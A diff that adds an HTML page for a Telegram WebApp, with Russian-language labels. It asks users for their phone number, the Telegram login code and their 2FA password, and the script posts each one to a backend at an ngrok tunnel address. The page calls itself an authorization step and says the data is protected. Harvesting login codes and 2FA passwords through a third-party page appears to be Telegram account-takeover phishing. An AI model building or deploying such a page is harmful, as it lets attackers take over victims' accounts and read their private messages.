@@ -1,0 +1,460 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Telegram WebApp Авторизация</title>
+  
+  <!-- Telegram WebApp SDK - обязательно подключаем согласно документации -->
+  <!-- https://core.telegram.org/bots/webapps -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --fg: #e5e7eb;
+      --card: #0f172a;
+      --muted: #94a3b8;
+      --border: #1f2937;
+      --accent: #38bdf8;
+      --success: #10b981;
+      --error: #ef4444;
+    }
+    
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--fg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.3);
+    }
+    
+    h1 {
+      margin-bottom: 8px;
+      font-size: 24px;
+      font-weight: 700;
+      color: #fff;
+    }
+    
+    .subtitle {
+      margin-bottom: 20px;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    
+    .step {
+      margin-bottom: 20px;
+    }
+    
+    .field {
+      margin-bottom: 16px;
+    }
+    
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+    
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 8px;
+      border: 1px solid #334155;
+      background: #0b1220;
+      color: var(--fg);
+      font-size: 15px;
+      outline: none;
+      transition: all 0.2s;
+    }
+    
+    input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.15);
+    }
+    
+    button {
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 8px;
+      border: none;
+      background: var(--accent);
+      color: #0b1220;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    
+    button:hover {
+      background: #0ea5e9;
+      transform: translateY(-1px);
+    }
+    
+    button:active {
+      transform: translateY(0);
+    }
+    
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+    
+    .status {
+      margin-top: 16px;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 13px;
+      text-align: center;
+      display: none;
+    }
+    
+    .status.visible {
+      display: block;
+    }
+    
+    .status.info {
+      background: rgba(56, 189, 248, 0.1);
+      color: var(--accent);
+      border: 1px solid rgba(56, 189, 248, 0.2);
+    }
+    
+    .status.success {
+      background: rgba(16, 185, 129, 0.1);
+      color: var(--success);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+    }
+    
+    .status.error {
+      background: rgba(239, 68, 68, 0.1);
+      color: var(--error);
+      border: 1px solid rgba(239, 68, 68, 0.2);
+    }
+    
+    .hidden {
+      display: none !important;
+    }
+    
+    .debug-info {
+      margin-top: 20px;
+      padding: 12px;
+      background: #0b1220;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      font-size: 11px;
+      color: #64748b;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🔐 Вход в Telegram</h1>
+    <p class="subtitle">
+      WebApp запущен внутри Telegram. Данные защищены через initData валидацию.
+    </p>
+
+    <!-- Шаг 1: Ввод телефона -->
+    <div id="step-phone" class="step">
+      <div class="field">
+        <label for="phone">📱 Номер телефона</label>
+        <input 
+          id="phone" 
+          type="tel" 
+          placeholder="+79998887766"
+          autocomplete="tel"
+        />
+      </div>
+      <button id="send-code">Отправить код</button>
+    </div>
+
+    <!-- Шаг 2: Ввод кода -->
+    <div id="step-code" class="step hidden">
+      <div class="field">
+        <label for="code">💬 Код из Telegram</label>
+        <input 
+          id="code" 
+          type="text" 
+          placeholder="12345"
+          autocomplete="one-time-code"
+        />
+      </div>
+      <button id="verify-code">Подтвердить код</button>
+    </div>
+
+    <!-- Шаг 3: Ввод пароля 2FA (если требуется) -->
+    <div id="step-2fa" class="step hidden">
+      <div class="field">
+        <label for="password">🔑 Пароль 2FA</label>
+        <input 
+          id="password" 
+          type="password" 
+          placeholder="Введите пароль"
+          autocomplete="current-password"
+        />
+      </div>
+      <button id="verify-password">Войти</button>
+    </div>
+
+    <!-- Статус -->
+    <div id="status" class="status"></div>
+
+    <!-- Debug info (опционально, для разработки) -->
+    <div id="debug" class="debug-info hidden"></div>
+  </div>
+
+  <script>
+    // ========== Configuration ==========
+    // Backend URL - должен совпадать с BACKEND_BASE в config.py
+    const API_BASE = 'https://supercritical-hatable-elanor.ngrok-free.dev';
+
+    // ========== Telegram WebApp Init ==========
+    const tg = window.Telegram?.WebApp;
+    
+    if (tg) {
+      // Инициализируем WebApp
+      tg.ready();
+      tg.expand();
+      
+      // Опционально: применяем цветовую тему Telegram
+      if (tg.themeParams) {
+        document.documentElement.style.setProperty('--accent', tg.themeParams.button_color || '#38bdf8');
+      }
+    }
+
+    // initData - подписанная строка от Telegram для валидации на backend
+    // Это ключевой параметр безопасности WebApp
+    const initData = tg ? tg.initData : '';
+    
+    // Debug: показываем initData (только для разработки!)
+    const debugEl = document.getElementById('debug');
+    if (initData) {
+      debugEl.textContent = `InitData length: ${initData.length} chars`;
+      debugEl.classList.remove('hidden');
+    }
+
+    // ========== DOM Elements ==========
+    const byId = id => document.getElementById(id);
+    
+    const stepPhone = byId('step-phone');
+    const stepCode = byId('step-code');
+    const step2fa = byId('step-2fa');
+    const statusEl = byId('status');
+    
+    const phoneInput = byId('phone');
+    const codeInput = byId('code');
+    const passwordInput = byId('password');
+    
+    const sendCodeBtn = byId('send-code');
+    const verifyCodeBtn = byId('verify-code');
+    const verifyPasswordBtn = byId('verify-password');
+
+    // ========== State ==========
+    let sessionId = null;
+
+    // ========== UI Helpers ==========
+    function show(el) { el.classList.remove('hidden'); }
+    function hide(el) { el.classList.add('hidden'); }
+
+    function setStatus(text, type = 'info') {
+      statusEl.textContent = text;
+      statusEl.className = `status visible ${type}`;
+      
+      // Опционально: обновляем MainButton в Telegram
+      if (tg && tg.MainButton) {
+        tg.MainButton.setText(text);
+      }
+    }
+
+    function clearStatus() {
+      statusEl.className = 'status';
+    }
+
+    function setLoading(button, loading) {
+      button.disabled = loading;
+      if (loading) {
+        button.dataset.originalText = button.textContent;
+        button.textContent = '⏳ Загрузка...';
+      } else {
+        button.textContent = button.dataset.originalText || button.textContent;
+      }
+    }
+
+    // ========== API Calls ==========
+    async function sendCode() {
+      const phone = phoneInput.value.trim();
+      
+      if (!phone.startsWith('+')) {
+        setStatus('❌ Телефон должен начинаться с + и кода страны', 'error');
+        return;
+      }
+      
+      setLoading(sendCodeBtn, true);
+      setStatus('📤 Отправляю код...', 'info');
+      
+      try {
+        const res = await fetch(`${API_BASE}/send_code`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone,
+            init_data: initData  // Передаём initData для валидации
+          })
+        });
+        
+        if (!res.ok) {
+          const error = await res.text();
+          throw new Error(error);
+        }
+        
+        const data = await res.json();
+        sessionId = data.session_id;
+        
+        setStatus('✅ Код отправлен! Проверьте Telegram', 'success');
+        hide(stepPhone);
+        show(stepCode);
+        codeInput.focus();
+        
+      } catch (e) {
+        setStatus(`❌ Ошибка: ${e.message}`, 'error');
+      } finally {
+        setLoading(sendCodeBtn, false);
+      }
+    }
+
+    async function verifyCode() {
+      const code = codeInput.value.trim();
+      
+      if (!sessionId || !code) {
+        setStatus('❌ Введите код', 'error');
+        return;
+      }
+      
+      setLoading(verifyCodeBtn, true);
+      setStatus('🔍 Проверяю код...', 'info');
+      
+      try {
+        const res = await fetch(`${API_BASE}/verify_code`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            session_id: sessionId,
+            code
+          })
+        });
+        
+        if (!res.ok) {
+          const error = await res.text();
+          throw new Error(error);
+        }
+        
+        const data = await res.json();
+        
+        if (data.twofa_required) {
+          // Требуется пароль 2FA
+          setStatus('🔐 Требуется пароль 2FA', 'info');
+          hide(stepCode);
+          show(step2fa);
+          passwordInput.focus();
+        } else {
+          // Успешный вход
+          const userName = data.user?.name || 'Пользователь';
+          setStatus(`🎉 Успешный вход! Привет, ${userName}`, 'success');
+          hide(stepCode);
+          
+          // Закрываем WebApp через 2 секунды
+          if (tg) {
+            setTimeout(() => tg.close(), 2000);
+          }
+        }
+        
+      } catch (e) {
+        setStatus(`❌ Ошибка: ${e.message}`, 'error');
+      } finally {
+        setLoading(verifyCodeBtn, false);
+      }
+    }
+
+    async function verifyPassword() {
+      const password = passwordInput.value.trim();
+      
+      if (!sessionId || !password) {
+        setStatus('❌ Введите пароль', 'error');
+        return;
+      }
+      
+      setLoading(verifyPasswordBtn, true);
+      setStatus('🔍 Проверяю пароль...', 'info');
+      
+      try {
+        const res = await fetch(`${API_BASE}/verify_password`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            session_id: sessionId,
+            password
+          })
+        });
+        
+        if (!res.ok) {
+          const error = await res.text();
+          throw new Error(error);
+        }
+        
+        const data = await res.json();
+        const userName = data.user?.name || 'Пользователь';
+        
+        setStatus(`🎉 Успешный вход! Привет, ${userName}`, 'success');
+        hide(step2fa);
+        
+        // Закрываем WebApp через 2 секунды
+        if (tg) {
+          setTimeout(() => tg.close(), 2000);
+        }
+        
+      } catch (e) {
+        setStatus(`❌ Ошибка: ${e.message}`, 'error');
+      } finally {
+        setLoading(verifyPasswordBtn, false);
+      }
+    }
+
+    // ========== Event Listeners ==========
+    sendCodeBtn.addEventListener('click', sendCode);
+    verifyCodeBtn.addEventListener('click', verifyCode);
+    verifyPasswordBtn.addEventListener('click', verifyPassword);
+
+    // Enter key support
+    phoneInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') sendCode();
+    });
+    
+    codeInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') verifyCode();
+    });
+    
+    passwordInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') verifyPassword();
+    });
+  </script>
+</body>
+</html>
